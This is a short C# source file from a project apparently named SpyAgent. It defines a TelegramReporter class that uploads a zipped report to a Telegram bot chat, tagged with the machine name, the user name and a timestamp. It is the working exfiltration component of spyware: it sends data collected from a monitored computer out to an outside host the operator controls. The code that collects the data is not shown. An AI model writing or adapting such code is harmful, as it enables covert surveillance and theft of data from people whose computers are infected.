namespace SpyAgent.Reporting;

using System.Net.Http.Headers;

internal sealed class TelegramReporter : IReporter
{
    private readonly string _botToken;
    private readonly string _chatId;
    private readonly HttpClient _http;

    public TelegramReporter(string botToken, string chatId)
    {
        _botToken = botToken;
        _chatId = chatId;
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(60) };
    }

    public async Task SendReportAsync(byte[] reportData)
    {
        var url = $"https://api.telegram.org/bot{_botToken}/sendDocument";

        using var form = new MultipartFormDataContent();
        form.Add(new StringContent(_chatId), "chat_id");

        var fileContent = new ByteArrayContent(reportData);
        fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/zip");
        var fileName = $"report_{Environment.MachineName}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.zip";
        form.Add(fileContent, "document", fileName);

        var caption = $"{Environment.MachineName} | {Environment.UserName} | {DateTime.UtcNow:u}";
        form.Add(new StringContent(caption), "caption");

        await _http.PostAsync(url, form);
    }
}
